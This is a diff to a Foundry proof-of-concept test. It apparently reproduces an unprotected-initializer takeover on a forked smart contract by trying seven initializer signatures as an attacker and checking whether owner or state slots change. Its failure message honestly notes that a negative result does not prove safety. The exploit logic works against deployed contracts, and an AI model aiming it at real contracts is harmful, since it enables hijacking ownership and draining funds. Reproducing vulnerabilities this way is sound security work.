@@ -29,22 +29,112 @@ contract PoC is Test {
         assertGt(target.code.length, 0, "target has no code at this fork block");
     }
 
+    function _staticAddr(address t, bytes memory data) internal view returns (address v) {
+        (bool ok, bytes memory ret) = t.staticcall(data);
+        if (ok && ret.length >= 32) v = abi.decode(ret, (address));
+    }
+
+    function _staticBool(address t, bytes memory data) internal view returns (bool v) {
+        (bool ok, bytes memory ret) = t.staticcall(data);
+        if (ok && ret.length >= 32) v = abi.decode(ret, (bool));
+    }
+
+    /// @dev Fingerprint of the state an initializer of this class would move:
+    ///      the owner slot, the initialized flag, and raw slot 0. A guarded or
+    ///      already-run initializer returns (or reverts) without touching these.
+    function _observe(address attacker) internal view returns (uint256) {
+        return uint256(
+            keccak256(
+                abi.encode(
+                    _staticAddr(target, abi.encodeWithSignature("owner()")),
+                    _staticBool(target, abi.encodeWithSignature("initialized()")),
+                    attacker.balance,
+                    vm.load(target, bytes32(0))
+                )
+            )
+        );
+    }
+
+    /// Try each plausible entry point and accept the first that changes the
+    /// OBSERVABLE -- never the first that returns. A no-op or already-guarded
+    /// function returns successfully and changes nothing, so judging by the call
+    /// result reports "not reproduced" for a vulnerability that exists under
+    /// another name.
+    function _attempt(address attacker, uint256 before, string memory label, bytes memory data)
+        internal
+        returns (string memory)
+    {
+        vm.prank(attacker);
+        (bool ok,) = target.call(data);
+        console.log("tried", label, ok ? "call returned" : "call reverted");
+        if (ok && _observe(attacker) != before) return label;
+        return "";
+    }
+
+    function _tryEntry(address attacker, uint256 before) internal returns (string memory used) {
+        address[] memory one = new address[](1);
+        one[0] = attacker;
+
+        used = _attempt(
+            attacker,
+            before,
+            "initialize(address)",
+            abi.encodeWithSignature("initialize(address)", attacker)
+        );
+        if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker,
+            before,
+            "initialize(address,address)",
+            abi.encodeWithSignature("initialize(address,address)", attacker, attacker)
+        );
+        if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker, before, "initialize()", abi.encodeWithSignature("initialize()")
+        );
+        if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker,
+            before,
+            "initialize(address[])",
+            abi.encodeWithSignature("initialize(address[])", one)
+        );
+        if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker, before, "init(address)", abi.encodeWithSignature("init(address)", attacker)
+        );
+        if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker,
+            before,
+            "initWallet(address[])",
+            abi.encodeWithSignature("initWallet(address[])", one)
+        );
+        if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker,
+            before,
+            "init(address[])",
+            abi.encodeWithSignature("init(address[])", one)
+        );
+        if (bytes(used).length > 0) return used;
+        return "";
+    }
+
     function test_exploit() public {
         address attackerEOA = makeAddr("attacker");
         vm.deal(attackerEOA, 1 ether);
 
-        // TODO: use the target's real initialize signature.
-        vm.prank(attackerEOA);
-        (bool ok,) = target.call(
-            abi.encodeWithSignature("initialize(address)", attackerEOA)
-        );
-        require(ok, "initialize(address) call failed -- adapt the signature");
+        uint256 before = _observe(attackerEOA);
+        string memory used = _tryEntry(attackerEOA, before);
+        console.log("entry point that changed state:", used);
 
-        (bool ownerOk, bytes memory ret) =
-            target.staticcall(abi.encodeWithSignature("owner()"));
-        require(ownerOk, "target has no owner() view -- adapt the ownership check");
-        address owner_ = abi.decode(ret, (address));
-        console.log("owner after initialize:", owner_);
-        assertEq(owner_, attackerEOA, "exploit did not reproduce: attacker is not owner");
+        uint256 afterState = _observe(attackerEOA);
+        uint256 delta = afterState != before ? 1 : 0;
+        assertGt(
+            delta,
+            0,
+            "no initializer variant changed the owner/initialized observable. Tried initialize(address), initialize(address,address), initialize(), initialize(address[]), init(address), initWallet(address[]), init(address[]). This does NOT establish safety: the initializer may be guarded by an `initializer` modifier or an owner check, already initialized, named differently, take other arguments, or the owner may live in another slot."
+        );
     }
 }
